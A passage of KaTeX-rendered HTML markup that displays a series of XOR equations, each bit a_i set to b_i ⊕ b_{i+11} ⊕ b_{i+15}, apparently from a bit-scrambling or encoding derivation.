class="vlist" style="height:23.29000000000002em;"><span style="top:-25.290000000000017em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-23.850000000000016em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-22.410000000000014em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-20.970000000000017em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-19.530000000000015em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-18.090000000000014em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-16.650000000000016em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-15.210000000000017em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-13.770000000000016em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-12.330000000000014em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">9</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-10.890000000000013em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-9.450000000000012em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" 